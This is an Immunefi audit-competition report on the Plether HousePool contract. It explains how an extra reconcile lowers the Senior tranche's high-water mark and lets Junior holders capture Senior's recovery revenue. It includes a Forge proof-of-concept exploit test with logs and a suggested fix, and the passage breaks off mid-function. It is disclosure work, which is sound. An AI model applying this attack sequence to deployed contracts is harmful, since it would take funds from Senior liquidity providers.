# \#99115 [SC-High] Re-reserved recapitalization residual in HousePool lowers the Senior high-water mark and lets Junior take Senior's recovery

**Submitted on Nov 11th 2026 at 23:39:16 UTC by @zer0luck_xint for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99115
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

After a terminal deficit, the owner recovers the pool with `CfdEngine.recapitalizePool` and `clearDegradedMode`. The part of the recapitalization that the deficit absorbs stays in `pendingRecapitalizationAssets`, and each later mark-fresh reconcile reserves it from distributable value even though the same value already backs the Senior principal assigned from this recapitalization. When the residual is at least the distributable value, the reservation empties Senior principal and the empty-waterfall bootstrap restarts Senior with only the residual as its high-water mark, so Senior's recovery target falls with no loss and no new inflow. A holder of Junior shares can trigger these reconciles through permissionless LP epoch settlement, and when the basket recovers, the revenue that should restore Senior principal to its high-water mark is paid to Junior holders instead: in the release configuration the attacker withdraws 8,493.18 USDG and the Senior LP withdraws 8,493.23 USDG less than without the attack.

## Vulnerability Details

Let `R` be the recapitalization and `D` the terminal deficit at the current mark price. After the recapitalization, distributable value is `R - D`.

**1. The first reconcile after the recapitalization.** `_settleablePendingClaimantBuckets` caps the pending recapitalization at the whole distributable value:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834

```solidity
        return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
```

`planReconcile` reserves the capped `R - D`, so the waterfall sees zero equity and both tranches are wiped. `_applyPendingClaimantBucketsLive` then applies `R - D` through the empty-waterfall bootstrap. The bootstrap target is meant to be the full recapitalization intent (HousePoolPendingPreviewLib.sol:110), and on this first reconcile the caller passes the whole pending amount `R`. Senior principal becomes `R - D` and the high-water mark becomes `R`:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L46-L49

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L103-L122

The residual `D` stays pending. The project's regression test for this state requires the residual to keep Senior's recovery target and to settle into Senior principal once backing returns (HousePoolWaterfall.t.sol:201, :217):

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol#L177-L219

**2. The next reconcile counts the same value twice.** At an unchanged mark price, distributable value is still `R - D`, and all of it backs Senior principal `R - D`. `_settleablePendingClaimantBuckets` caps the residual `D` at that same distributable value, so for `R <= 2D` it reserves all of `R - D`, and `planReconcile` subtracts it:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L71

By design, the reserved amount is value already represented in `snapshot.distributable` that ordinary reconciliation must not assign a second time (HousePoolReconcilePlanLib.sol:41-42, ACCOUNTING_SPEC.md:336-340). Here that value is Senior's principal, so the reservation creates a shortfall equal to Senior principal and the waterfall charges it to Senior:

https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L84-L105

The bootstrap runs whenever Senior shares exist and both principals are zero (HousePoolPendingPreviewLib.sol:117-122). At this reconcile no loss has occurred: pool assets, trader claims and Senior principal are unchanged since the first reconcile, so the zero principal comes only from the reservation. With Senior principal at zero, `_applyPendingClaimantBucketsLive` takes the bootstrap again. This time the caller passes the residual `D` as the recapitalization intent, which gives a high-water mark of `max(D, R - D) = D`. Senior principal returns to `R - D`, the high-water mark falls from `R` to `D`, and `pendingRecapitalizationAssets` drops to `2D - R`. The next reconcile applies that remainder through the ordinary restore step.

**3. Recovery pays Junior.** Revenue restores Senior principal up to its high-water mark and then pays Junior (ACCOUNTING_SPEC.md:338). With the high-water mark at `D` instead of `R`, Junior receives the recovered value between `D` and `R`.

Steps 2 and 3 depart from the accounting design. The high-water mark records the Senior entitlement that future revenue must restore, and even a real loss does not reduce it (ACCOUNTING_SPEC.md:332-337); here it falls at a reconcile with no loss at all. Senior impairment is restored before Junior extracts surplus (SECURITY.md:394), and reserved pending claimant inflows are not counted twice (ACCOUNTING_SPEC.md:339-340).

The cap and the bootstrap target were added in commit 31a38bb7 (Plether-Fi/plether-core#29) so that unsettled recapitalization stays pending and reserved until it is backed. The defect reported here is introduced by that change. The residual instead settles against value that is already assigned, and the first such settlement lowers the recovery target. A single additional `pool.reconcile()` before backing returns makes the project's regression test fail with `Residual recap should settle once backing becomes available: 50040000000 != 100000000000`.

**Trigger.** On the release deployment, the permissionless mark-fresh reconcile runs inside `OrderRouter.settleLpEpoch(bytes[])`. The reconcile runs first, and the whole call reverts unless some request makes progress (HousePool.sol:835, :1183-1185). In the demonstrated depressed-mark state, a refunded Junior redemption provides that progress. Queued tranche deposits do not settle, because the entry check rejects a pending claimant bucket or a Senior principal below its high-water mark (HousePool.sol:908, :1108, HousePoolTrancheGateLib.sol:32-38). A Senior redemption cannot be funded while the pending residual is at least the free cash, because the residual is reserved from free cash (HousePool.sol:1727-1735). A Junior redemption at zero Junior principal quotes zero and is refunded, and the refund counts as progress (HousePool.sol:960-985). The holder claims the refund and requests again in the next eligible LP epoch.

## Impact Details

Severity: High, Theft of unclaimed yield.

The misrouted value is pool revenue that arrives after the attack: reconciliation books the rise in distributable value as revenue and distributes it through the waterfall (HousePoolReconcilePlanLib.sol:92-99). No tranche holds it when the high-water mark falls; the waterfall owes it to Senior restoration and instead credits it to Junior. The attacker's settlements leave credited Senior principal unchanged at 24,250.00 USDG; the loss arises only when that revenue arrives. Any holder of Junior shares wiped by the deficit can carry out the attack for gas and the Pyth update fee. When backing returns, Senior LPs lose the misrouted recovery and Junior holders, including the attacker, receive it pro rata.

The owner's `recapitalizePool` and `clearDegradedMode` are the protocol's recovery actions (packages/perps/SECURITY.md:155-162, :246) and behave as designed; every harmful step after them is permissionless.

In the release deployment with release parameters, the control and the attack start from the same snapshot after the first post-recapitalization settlement. Both refresh the 0.30 mark at the same 2 follow-up times, then run the same recovery settlement and final cash claims. They differ in the attacker's 2 refunded Junior redemption requests at the depressed mark. In the control nobody queues an LP request while the basket stays depressed, and both settlement attempts revert together with their reconciles because no request makes progress (HousePool.sol:1183-1185). The attacker holds every Junior share apart from the owner's seed position.

| | Control | Attack |
|---|---|---|
| Terminal deficit `D` / recapitalization `R` | 40,495.25 / 64,745.25 | same |
| Senior high-water mark after the first follow-up settlement attempt | 64,745.25 | 40,495.25 |
| Senior principal plus funded redemptions after recovery | 49,000.00 | 40,495.25 |
| Junior principal after recovery | 0.00 | 8,504.75 |
| USDG the Senior LP withdraws | 48,987.85 | 40,494.62 |
| USDG the attacker withdraws for its Junior shares | 0.00 | 8,493.18 |

Recapitalizing Senior's remaining impairment does not restore the intended state either. If the owner recapitalizes the gap between Senior principal and its high-water mark (40,495.25 USDG) after the first settlement, the next settlement at the depressed mark price reserves it together with the residual, wipes Senior again, and the bootstrap sets the high-water mark to 80,990.50 instead of 64,745.25. Recovery revenue that belongs to Junior once Senior is restored to 64,745.25 therefore goes to Senior up to the 16,245.25 USDG excess of the raised mark, and at recovery Junior principal reaches only 8,504.75 USDG (`test_followUpRecapitalization`).

Prerequisites:
- A terminal deficit that wipes both tranches. Risk-increasing opens and LP redemption funding keep signed terminal equity non-negative at any single mark price (SECURITY.md:339, :342; WHITEPAPER.md:218-238), so a deficit needs a profitable close that latches degraded mode (CfdEngine.sol:1351-1369) and then opposite-side profit at a later mark price above the remaining backing (WHITEPAPER.md:268-290). With the pool at the withdrawal firewall and equal LONG and SHORT maximum-profit liabilities, as in the scenario, the 2 profits must together exceed 1.0025 times that liability (1 plus the 25 bps settlement buffer, DEPLOYMENT.md:143). A symmetric move therefore needs a fall of at least 40.1% and then a rise to at least 40.1% above entry from the scenario's entry price of 1.20, and 50.1% each way from an entry price of 1.00. In the scenario, public trades and a Junior redemption to the firewall produce the deficit at mark prices 1.20, 0.30, 1.99 and 0.30 (Proof of Concept steps 2-4). The protocol persists this state on reconcile and blocks LP entry (SECURITY.md:346), contains it with degraded mode, and handles it with the terminal-deficit runbook, whose recovery steps are to recapitalize or clear positions and then clear degraded mode (SECURITY.md:1499-1510).
- A settlement at which the residual is at least the distributable value, so that the reservation empties Senior principal. At an unchanged mark price this means `R <= 2D`, which holds in this scenario (64,745.25 <= 80,990.50, with `R` equal to the `clearDegradedMode` minimum plus 1,000 USDG). Because `clearDegradedMode` requires pool assets net of trader claims to cover the larger side's maximum-profit liability (CfdEngine.sol:655-667), `R` exceeds `D` by at least the remaining maximum-profit liability less the net profit of the open positions at that mark price, so the deficit must be at least that difference.
- The basket stays at the depressed mark price through 3 eligible LP epoch settlements after `clearDegradedMode`. The first creates the residual, the second lowers the high-water mark to `D`, and the third applies the `2D - R` remainder through the restore step (this needs `2D - R < R - D`; here 16,245.25 < 24,250.00). The attacker supplies the second and third, 2 hours apart in the PoC.
- No Senior redemption request is waiting at those settlements. A matured Senior request that free cash cannot fund stops the Junior phase (HousePool.sol:878-879), and the settlement reverts.
- Revenue after the attack. Revenue first restores Senior principal from `R - D` to the lowered high-water mark `D`, so Junior receives only revenue above `2D - R` (16,245.25 USDG here), and the amount moved is at most `R - D`. In the scenario this revenue comes from the basket's return from 0.30 to 1.20.

The high-water mark falls by `R - D` (24,250.00 USDG here), which bounds the recovery that can move to Junior; in the scenario 8,504.75 USDG of credited principal moves, and after the final cash claims the Senior LP has received 8,493.23 USDG less and the attacker 8,493.18 USDG more. The Senior LP has no remaining wallet or queued redemption shares at that point.

## Recommendation

While part of a recapitalization that bootstrapped an empty waterfall is still pending, a later bootstrap from that residual should keep the Senior high-water mark the first bootstrap recorded instead of replacing it with the pending amount. HousePool can track this with a flag that is set when a bootstrap leaves a residual and cleared when `pendingRecapitalizationAssets` reaches zero. While the flag is set, the live and the preview reconcile both pass the current high-water mark as the bootstrap target to `applyPendingClaimantBucketsPreview`. The residual then keeps settling and releasing free cash as it does at the audit commit, and a follow-up recapitalization of the gap between Senior principal and its high-water mark restores Senior to its existing target. HousePool's runtime is 24,571 bytes at the audit commit, 5 bytes below the EIP-170 limit of 24,576 bytes, so the added flag and branches need other HousePool code moved into a library or sidecar.

## References

- Audit commit: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8
- Change that added the cap and the bootstrap target: Plether-Fi/plether-core#29 (commit 31a38bb7)
- Senior high-water mark and reconciliation order: `packages/perps/ACCOUNTING_SPEC.md:333-340`; recapitalization routing: `ACCOUNTING_SPEC.md:634-643`
- Owner recovery: `packages/perps/SECURITY.md` (Owner-funded recapitalization), `CfdEngine.sol:632` (`recapitalizePool`), `CfdEngine.sol:658-667` (`clearDegradedMode`)
- Release parameters: `packages/perps/DEPLOYMENT.md` and `script/DeployPerpsArbitrumSepolia.s.sol`

## Proof of Concept

## Proof of Concept

The test deploys the release contracts with `script/DeployPerpsArbitrumSepolia.s.sol` inside Forge. In-scope contracts are unmodified. Only out-of-scope components are mocked:
- Pyth: the repository's `test/mocks/MockPyth.sol`, etched at the release Pyth address.
- USDG: the release `MockUSDG`.
- The ArbSys block-number precompile.

The PoC is a single file, `RecapResidualHwmReset.t.sol`, with 2 tests. `test_recapResidualResetsSeniorHighWaterMark` runs the attack through public entry points; only step 5 uses the owner's recovery functions:
1. A Junior LP (the attacker) deposits 200,000 USDG and a Senior LP deposits 30,000 USDG.
2. 5 traders open positions at 1.20 (LONG 70,000 and SHORT 105,000 basket units).
3. The attacker requests redemption of 95% of its Junior shares; settlement funds it down to the withdrawal firewall.
4. The basket moves to 0.30, where trader A closes its LONG for cash. It then moves to 1.99, where B and H close and X closes 15,000 of its 27,500 units; B takes the remaining cash, and the unpaid trader claims of H and X total 33,530.41 USDG. Back at 0.30, signed terminal equity is -40,495.25 USDG and degraded mode is latched.
5. The owner calls `recapitalizePool(R)` with `R` equal to the `clearDegradedMode` minimum plus 1,000 USDG, then calls `clearDegradedMode`.
6. The attacker requests a redemption of all its Junior shares, and an arbitrary address (the test's `keeper`, which holds no role) calls `OrderRouter.settleLpEpoch` (settlement 1). The test checks that the high-water mark equals `R`, Junior principal is zero and the pending recapitalization equals `D`, then takes a snapshot.
7. Control: the mark is refreshed at 0.30 at 2 follow-up times, 2 hours apart, and nobody queues an LP request. Both settlement attempts at 0.30 revert with `HousePool__NoLpEpochProgress`, so the high-water mark stays at `R`. The basket then recovers to 1.20, where a Senior redemption request for 2,000 USDG of shares settles.
8. Attack: at those same 2 timestamps, the attacker's refunded Junior requests settle at 0.30, with pool assets, trader claims and Senior principal unchanged and the high-water mark lower. Then the same Senior redemption request settles at 1.20.
9. In both sequences the remaining traders close at 1.20, and both LPs request redemption of their wallet shares in the next settlement and claim funded cash and refunds. The Senior LP has no wallet or queued redemption shares afterward; the reported Junior amount is USDG already claimed at that point.
10. The test checks equal timestamps and equal total LP equity in both sequences, Junior principal of zero and an impaired Senior in the control, a positive Junior principal in the attack, and that the attacker's withdrawn USDG matches the Senior LP's shortfall within 1 USDG.

`test_followUpRecapitalization` repeats steps 1-6, then has the owner recapitalize the gap between Senior principal and its high-water mark, and checks that the high-water mark rises above `R` and that Senior takes recovery revenue up to the raised mark.

On a fresh clone of the audit commit, run `git submodule update --init --recursive`. Create `test/poc/` at the repository root, place `RecapResidualHwmReset.t.sol` (source at the end of this section) in it, then run from the repository root with Forge 1.5.1:

```bash
forge test --match-path test/poc/RecapResidualHwmReset.t.sol -vv
```

Excerpt from the output of the command above for `test_recapResidualResetsSeniorHighWaterMark` (deployment lines omitted):

```
[PASS] test_recapResidualResetsSeniorHighWaterMark() (gas: 35321929)
Logs:
  terminal deficit D at the depressed mark       40495248820
  owner recapitalization R                   64745248820
  unpaid trader claims C at the depressed mark 33530409810
  after settlement #1 at the depressed mark
     seniorPrincipal / juniorPrincipal  24250000000 0
     seniorHighWaterMark / pendingRecap 64745248820 40495248820
  CONTROL after recovery
     seniorPrincipal / juniorPrincipal  48120000000 0
     seniorHighWaterMark / pendingRecap 63582477005 0
  ATTACK after settlement #2 at the depressed mark
     seniorPrincipal / juniorPrincipal  24250000000 0
     seniorHighWaterMark / pendingRecap 40495248820 16245248820
  ATTACK after settlement #3 at the depressed mark
     seniorPrincipal / juniorPrincipal  24250000000 0
     seniorHighWaterMark / pendingRecap 40495248820 0
  ATTACK after recovery
     seniorPrincipal / juniorPrincipal  39615248820 8504751180
     seniorHighWaterMark / pendingRecap 39615248820 0
  --- attack minus control
  Senior tranche (principal + funded escrow) control / attack 49000000000 40495248820
  Junior principal                           control / attack 0 8504751180
  Senior LP share value delta
  -8504467693
  Attacker Junior position value delta
  8504594262
  Owner Junior seed value delta
  156918
  --- final LP settlement and cash claims (traders closed)
  Senior LP USDG received  control / attack 48987854348 40494622539
  Attacker USDG received   control / attack 0 8493177453
  Senior LP USDG delta (attack - control)
  -8493231809
  Attacker USDG delta (attack - control)
  8493177453
```

Excerpt from the same output for `test_followUpRecapitalization`, which Forge prints first (deployment lines omitted):

```
[PASS] test_followUpRecapitalization() (gas: 28611768)
Logs:
  FOLLOW-UP: R / gap recapitalized 64745248820 40495248820
  FOLLOW-UP after the next settlement
     seniorPrincipal / juniorPrincipal  64745248820 0
     seniorHighWaterMark / pendingRecap 80990497640 16245248820
  FOLLOW-UP after one more settlement
     seniorPrincipal / juniorPrincipal  64745248820 0
     seniorHighWaterMark / pendingRecap 80990497640 0
  FOLLOW-UP after recovery
     seniorPrincipal / juniorPrincipal  78990497641 8504751180
     seniorHighWaterMark / pendingRecap 78990497641 0
     unassignedAssets 0
  FOLLOW-UP final cash claims: Senior LP USDG / Junior holder USDG 80989240695 154326210695
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 81.06ms (119.29ms CPU time)
```

For an independent regression in the project's own test suite, add one extra reconcile to `test_PendingRecapitalization_CapsAgainstTraderClaimLiabilitiesAndCarriesResidual` in `packages/perps/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol`, immediately before `_setTotalTraderClaim(0);` makes the backing available. `HousePool.reconcile` accepts only a vault caller (`onlyVault`), so the extra call is pranked as the Senior vault, like the test's own reconcile that follows it.

`packages/perps` is a separate Foundry project. From the repository root, apply the change and run the test in that directory:

```bash
cd packages/perps
git apply <<'EOF'
--- a/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol
+++ b/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol
@@ -210,6 +210,8 @@
         assertEq(viewData.freeAssets, 0, "Residual pending recap should reserve remaining free liquidity");
         assertEq(pool.getMaxSeniorWithdraw(), 0, "Residual pending recap should reserve senior withdrawals");
 
+        vm.prank(address(seniorVault));
+        pool.reconcile(); // one extra reconcile at an unchanged state
         _setTotalTraderClaim(0);
         vm.prank(address(seniorVault));
         pool.reconcile();
EOF
forge test --match-path test/perps/accounting/waterfall/HousePoolWaterfall.t.sol --match-test test_PendingRecapitalization_CapsAgainstTraderClaimLiabilitiesAndCarriesResidual -vv
```

Result excerpt (compiler output and the suite and failure summaries omitted):

```
[FAIL: Residual recap should settle once backing becomes available: 50040000000 != 100000000000] test_PendingRecapitalization_CapsAgainstTraderClaimLiabilitiesAndCarriesResidual() (gas: 764203)
```

### Source files

#### `RecapResidualHwmReset.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {DeployPerpsArbitrumSepolia} from "../../script/DeployPerpsArbitrumSepolia.s.sol";
import {MockPyth} from "../mocks/MockPyth.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {Test, console2} from "forge-std/Test.sol";

// Release deployment fixture: deploys the release contracts with script/DeployPerpsArbitrumSepolia.s.sol inside
// the local Forge EVM, as test/scripts/MockUSDGPerpsLifecycle.t.sol does: release wrappers (Senior cap 40M/80%, adverse
// multiplier 2500, minOpenNotional 1000 USDG), release risk parameters, six Pyth feeds with inversions. Only out-of-scope
// components are mocked: Pyth (MockPyth etched at the release Pyth address), USDG (the release MockUSDG), ArbSys (address(100)).

/// @dev Mirrors the Arbitrum precompile's block-number view inside the local test EVM.
contract ReleaseFixtureArbSys {

    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }

}

abstract contract ReleaseFixture is Test {

    address internal constant RELEASE_PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;
    uint256 internal constant DEPLOYER_KEY = 0xA11CE;
    uint256 internal constant MONDAY_MORNING = 1_709_532_000; // Mon 2024-03-04 06:00 UTC (live market)
    uint256 internal constant BASKET_1_20 = 120_000_000; // normalized basket mark 1.20 (8 decimals)
    uint8 internal constant MODE_LIVE = 1;
    uint8 internal constant MODE_FAD = 2;
    uint8 internal constant MODE_FROZEN = 4;
    uint8 internal constant MODE_ANY = 7;

    DeployPerpsArbitrumSepolia.DeployedContracts internal d;
    address internal owner;
    address internal keeper = makeAddr("keeper");
    uint256 internal clientNonce;

    function setUp() public virtual {
        vm.chainId(421_614);
        vm.warp(MONDAY_MORNING);
        ReleaseFixtureArbSys arbSys = new ReleaseFixtureArbSys();
        vm.etch(address(100), address(arbSys).code);
        MockPyth pyth = new MockPyth();
        vm.etch(RELEASE_PYTH, address(pyth).code);
        vm.setEnv("TEST_PRIVATE_KEY", vm.toString(DEPLOYER_KEY));
        d = DeployPerpsArbitrumSepolia(deployCode("DeployPerpsArbitrumSepolia.s.sol:DeployPerpsArbitrumSepolia")).run();
        owner = vm.addr(DEPLOYER_KEY);

        // Permanent 1 USDG seeds per tranche (release values), then activation.
        d.settlementToken.mint(owner, 2e6);
        vm.startPrank(owner);
        d.settlementToken.approve(address(d.housePool), 2e6);
        d.housePool.initializeSeedPosition(false, 1e6, owner);
        d.housePool.initializeSeedPosition(true, 1e6, owner);
        d.housePool.activateTrading();
        vm.stopPrank();

        _setBasketPrices(BASKET_1_20);
        d.router.updateMarkPrice(_updateData());
    }

    // ---------------------------------------------------------------- prices

    function _oracle() internal view returns (PletherOracle) {
        return PletherOracle(d.pletherOracle);
    }

    /// @dev Sets all six feeds so the normalized basket equals `basketPrice`, published at the current block time.
    function _setBasketPrices(
        uint256 basketPrice
    ) internal {
        _setBasketPricesAt(basketPrice, vm.getBlockTimestamp());
    }

    function _setBasketPricesAt(
        uint256 basketPrice,
        uint256 publishTime
    ) internal {
        for (uint256 i; i < 6; ++i) {
            _setFeed(i, basketPrice, publishTime);
        }
    }

    /// @dev Sets one component so that it alone would give normalized basket `basketPrice`, at `publishTime`.
    function _setFeed(
        uint256 i,
        uint256 basketPrice,
        uint256 publishTime
    ) internal {
        PletherOracle oracle = _oracle();
        uint256 normalizedPrice = oracle.basePrices(i) * basketPrice / 1e8;
        uint256 feedPrice = oracle.inversions(i) ? 1e16 / normalizedPrice : normalizedPrice;
        MockPyth(RELEASE_PYTH).setPrice(oracle.pythFeedIds(i), int64(uint64(feedPrice)), int32(-8), publishTime);
    }

    /// @dev Same as _setFeed with an explicit confidence (in feed units).
    function _setFeedWithConf(
        uint256 i,
        uint256 basketPrice,
        uint64 conf,
        uint256 publishTime
    ) internal {
        PletherOracle oracle = _oracle();
        uint256 normalizedPrice = oracle.basePrices(i) * basketPrice / 1e8;
        uint256 feedPrice = oracle.inversions(i) ? 1e16 / normalizedPrice : normalizedPrice;
        MockPyth(RELEASE_PYTH).setPrice(oracle.pythFeedIds(i), int64(uint64(feedPrice)), conf, int32(-8), publishTime);
    }

    /// @dev A non-encoded payload makes the MockPyth double use the configured per-feed prices.
    function _updateData() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = "";
    }

    function _refreshMark(
        uint256 basketPrice
    ) internal {
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        d.router.updateMarkPrice(_updateData());
    }

    // ---------------------------------------------------------------- time

    function _warp(
        uint256 dt
    ) internal {
        vm.warp(vm.getBlockTimestamp() + dt);
        vm.roll(vm.getBlockNumber() + 1 + dt / 4);
    }

    function _warpTo(
        uint256 t
    ) internal {
        uint256 nowTs = vm.getBlockTimestamp();
        require(t >= nowTs, "warp back");
        vm.roll(vm.getBlockNumber() + 1 + (t - nowTs) / 4);
        vm.warp(t);
    }

    // ---------------------------------------------------------------- USDG and LPs

    function _mint(
        address to,
        uint256 amount
    ) internal {
        d.settlementToken.mint(to, amount);
    }

    function _vault(
        bool senior
    ) internal view returns (TrancheVault) {
        return senior ? d.seniorVault : d.juniorVault;
    }

    function _requestDeposit(
        bool senior,
        address lp,
        uint256 assets
    ) internal returns (uint256 requestId) {
        TrancheVault v = _vault(senior);
        _mint(lp, assets);
        vm.startPrank(lp);
        d.settlementToken.approve(address(v), assets);
        requestId = v.requestDeposit(assets, lp, lp);
        vm.stopPrank();
    }

    /// @dev Warps to the request's epoch start (if not past) and settles through the Router's atomic oracle route.
    function _settleEpoch(
        uint256 requestId,
        uint256 basketPrice
    ) internal {
        uint256 start = d.housePool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() < start) {
            _warpTo(start);
        }
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        d.router.settleLpEpoch(_updateData());
    }

    function _claimDeposit(
        bool senior,
        address lp,
        uint256 requestId
    ) internal returns (uint256 shares) {
        TrancheVault v = _vault(senior);
        uint256 claimable = v.claimableDepositRequest(requestId, lp);
        vm.prank(lp);
        shares = v.claimDeposit(requestId, claimable, lp, lp);
    }

    /// @dev Request, settle at `basketPrice`, claim. Returns shares.
    function _lpDeposit(
        bool senior,
        address lp,
        uint256 assets,
        uint256 basketPrice
    ) internal returns (uint256 shares) {
        uint256 requestId = _requestDeposit(senior, lp, assets);
        _settleEpoch(requestId, basketPrice);
        shares = _claimDeposit(senior, lp, requestId);
    }

    function _requestRedeem(
        bool senior,
        address lp,
        uint256 shares
    ) internal returns (uint256 requestId) {
        vm.prank(lp);
        requestId = _vault(senior).requestRedeem(shares, lp, lp);
    }

    function _claimRedeem(
        bool senior,
        address lp,
        uint256 requestId
    ) internal returns (uint256 assets) {
        TrancheVault v = _vault(senior);
        uint256 shares = v.claimableRedeemRequest(requestId, lp);
        vm.prank(lp);
        assets = v.claimRedeem(requestId, shares, lp, lp);
    }

    // ---------------------------------------------------------------- traders

    function _fundTrader(
        address trader,
        uint256 assets
    ) internal {
        _mint(trader, assets);
        vm.startPrank(trader);
        d.settlementToken.approve(address(d.clearinghouse), assets);
        d.clearinghouse.depositMargin(assets);
        vm.stopPrank();
    }

    /// @dev Permissive bounds: no practical ceilings (zero means zero, so ceilings use max values).
    function _bounds(
        uint8 modes
    ) internal view returns (OrderV3Types.ExecutionBounds memory b) {
        b.submitBy = uint64(vm.getBlockTimestamp() + 60);
        b.executionWindowSeconds = 60;
        b.allowedExecutionModes = modes;
        b.expectedConfigHash = d.lifecycleBook.currentExecutionConfigHash();
        b.maxExecutionBountyAssets = type(uint256).max;
        b.maxExecutionNotionalAssets = type(uint256).max;
        b.maxGrossAccountDebitAssets = type(uint256).max;
        b.maxActionChargeAssets = type(uint256).max;
        b.maxExplicitFeesAssets = type(uint256).max;
        b.maxPostPositionSize = type(uint256).max;
        b.minPostSettlementBalanceAssets = 0;
        b.minPostPositionEquityAssets = 0;
        b.maxPostLeverageBps = type(uint32).max;
    }

    function _nextClientId() internal returns (bytes32) {
        return bytes32(uint256(keccak256(abi.encode("poc", ++clientNonce))));
    }

    /// @param size synthetic size in 1e18 units; must be a multiple of 100e18 (positionSizeQuantum 1e20).
    function _openReq(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 targetPrice
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = _nextClientId();
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.targetPrice = targetPrice;
        r.isClose = false;
        r.bounds = _bounds(MODE_LIVE | MODE_FAD);
    }

    function _closeReq(
        CfdTypes.Side side,
        uint256 size,
        uint256 targetPrice
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = _nextClientId();
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = 0;
        r.targetPrice = targetPrice;
        r.isClose = true;
        r.bounds = _bounds(MODE_ANY);
    }

    function _commit(
        address trader,
        OrderV3Types.OrderRequest memory r
    ) internal returns (uint64 orderId) {
        vm.prank(trader);
        orderId = d.router.commitOrder(r);
    }

    /// @dev Advances 7 s / 2 blocks (past the commit tick), publishes `basketPrice`, executes as `keeper`.
    function _execute(
        uint64 orderId,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        vm.warp(vm.getBlockTimestamp() + 7);
        vm.roll(vm.getBlockNumber() + 2);
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        result = d.router.executeOrder(orderId, _updateData());
    }

    function _openPosition(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        // Slippage targets: a LONG gains when the basket falls, so it opens at a price >= target and closes at <= target.
        uint256 target = side == CfdTypes.Side.LONG ? 1 : basketPrice * 2;
        uint64 id = _commit(trader, _openReq(side, size, margin, target));
        result = _execute(id, basketPrice);
    }

    function _closePosition(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 basketPrice
    ) internal returns (OrderV3Types.ExecutionResult memory result) {
        uint256 target = side == CfdTypes.Side.LONG ? basketPrice * 2 : 1;
        uint64 id = _commit(trader, _closeReq(side, size, target));
        result = _execute(id, basketPrice);
    }

    function _requireExecuted(
        OrderV3Types.ExecutionResult memory r,
        string memory label
    ) internal pure {
        if (r.status != OrderV3Types.LifecycleStatus.Executed) {
            console2.log("order not executed:", label);
            console2.log("  status", uint256(uint8(r.status)));
            console2.log("  terminalReason", uint256(uint8(r.terminalReason)));
            revert(label);
        }
    }

    function _liquidate(
        address account,
        uint256 basketPrice
    ) internal {
        _setBasketPrices(basketPrice);
        vm.prank(keeper);
        d.router.executeLiquidation(account, _updateData());
    }

    // ---------------------------------------------------------------- state views

    function _poolAssets() internal view returns (uint256) {
        return d.housePool.totalAssets();
    }

    function _usdgOf(
        address a
    ) internal view returns (uint256) {
        return d.settlementToken.balanceOf(a);
    }

    function _logState(
        string memory label
    ) internal view {
        console2.log("==", label);
        console2.log("  pool totalAssets      ", d.housePool.totalAssets());
        console2.log("  pool raw USDG         ", _usdgOf(address(d.housePool)));
        console2.log("  seniorPrincipal       ", d.housePool.seniorPrincipal());
        console2.log("  juniorPrincipal       ", d.housePool.juniorPrincipal());
        console2.log("  clearinghouse USDG    ", _usdgOf(address(d.clearinghouse)));
        console2.log("  seniorVault USDG      ", _usdgOf(address(d.seniorVault)));
        console2.log("  juniorVault USDG      ", _usdgOf(address(d.juniorVault)));
        console2.log("  total trader claims   ", d.engine.totalTraderClaimBalanceAssets());
        console2.log("  engine mark           ", d.engine.lastMarkPrice());
        console2.log("  degradedMode          ", d.engine.degradedMode());
    }

    /// @dev Sum of USDG held by every in-scope custody contract (Clearinghouse, HousePool, both vaults, Engine).
    function _custodyUsdg() internal view returns (uint256) {
        return _usdgOf(address(d.clearinghouse)) + _usdgOf(address(d.housePool)) + _usdgOf(address(d.seniorVault))
